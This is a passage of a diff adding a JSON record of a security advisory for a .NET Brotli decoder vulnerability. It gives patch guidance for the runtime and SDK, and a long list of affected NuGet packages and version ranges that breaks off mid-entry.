11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.win-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.win-x64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.win-x86) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nYou are affected if your application uses an affected Brotli decoder included in a package listed in [affected packages](#affected-packages), including a decoder linked into a NativeAOT application, to decompress attacker-controlled data. See [mitigations](#mitigations) for the affected usage paths and default settings.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\nInstall the updated runtime or SDK for the .NET version used by your application. If your application directly references an affected package, update that reference to the patched version listed above.\n\n.NET release | Runtime | SDK versions\n------------ | ------- | ------------\n.NET 8 | 8.0.33 | 8.0.133, 8.0.427\n.NET 9 | 9.0.22 | 9.0.123, 9.0.320\n.NET 10 | 10.0.14 | 10.0.114, 10.0.403\n.NET 11 previews | 11.0.0-rc.3.26522.148 | 11.0.100-rc.3.26522.148\n\nDownload .NET from https://dotnet.microsoft.com/download/dotnet.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nIf you have deployed [self-contained applications](https://learn.microsoft.com/dotnet/core/deploying/#self-contained-deployments), rebuild and redeploy those applications with the updated runtime.\n\nFor NativeAOT applications, update the SDK and any explicit compiler or runtime-pack references to patched versions, then republish and redeploy the application. Updating the machine's shared runtime alone does not replace a decoder already linked into a NativeAOT executable.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the [MSRC Researcher Portal](https://msrc.microsoft.com/report/vulnerability/new). Further information can be found in the MSRC [Report an Issue FAQ](https://www.microsoft.com/msrc/faqs-report-an-issue).\n\nSecurity reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.\n\n### Disclaimer\n\nThe information provided in this advisory is provided \"as is\" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.\n\n### External Links\n\n[CVE-2026-111497](https://www.cve.org/CVERecord?id=CVE-2026-111497)\n\n### Revisions\n\nV1.0 (10/25/2026): Initial advisory.",
+      "url": "https://github.com/advisories/GHSA-p3jp-9v83-76w9",
+      "severity": "high",
+      "type": "reviewed",
+      "published": "2026-11-03T17:33:48Z",
+      "updated": "2026-11-03T17:33:55Z",
+      "withdrawn": null,
+      "credits": [],
+      "vulnerabilities": [
+        {
+          "package": "Microsoft.DotNet.ILCompiler",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.osx-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.osx-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.tvos-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.LLVM.linux-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.LLVM.linux-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.LLVM.osx-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-arm",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-x86",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.browser-wasm",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.ios-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.iossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.iossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.linux-arm",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.linux-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.linux-musl-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.linux-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.maccatalyst-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.maccatalyst-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.multithread.browser-wasm",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.osx-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.osx-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.tvos-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.tvossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.tvossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.wasi-wasm",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.win-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.win-x86",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-arm",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-bionic-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-bionic-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-musl-arm",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-musl-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-musl-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.osx-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.osx-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.win-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.win-x64",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.win-x86",
+          "ecosystem": "nuget",
+          "range": ">= 8.0.0, < 8.0.33",
+          "patched": "8.0.33"
+        },
+        {
+          "package": "Microsoft.DotNet.ILCompiler",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.osx-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.osx-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.tvos-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.win-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.win-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.win-x86",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-arm",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-x86",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.browser-wasm",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.ios-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.iossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.iossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.maccatalyst-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.maccatalyst-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.multithread.browser-wasm",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.tvos-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.tvossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.tvossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.wasi-wasm",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-arm",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-bionic-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-bionic-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-musl-arm",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-musl-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-musl-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.osx-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.osx-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.win-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.win-x64",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.win-x86",
+          "ecosystem": "nuget",
+          "range": ">= 9.0.0, < 9.0.22",
+          "patched": "9.0.22"
+        },
+        {
+          "package": "Microsoft.DotNet.ILCompiler",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.android-arm",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.android-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.android-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.osx-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.osx-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.tvos-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.win-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.win-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.win-x86",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-arm",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-x86",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.browser-wasm",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.ios-arm64",
+          "ecosystem": "nuget",
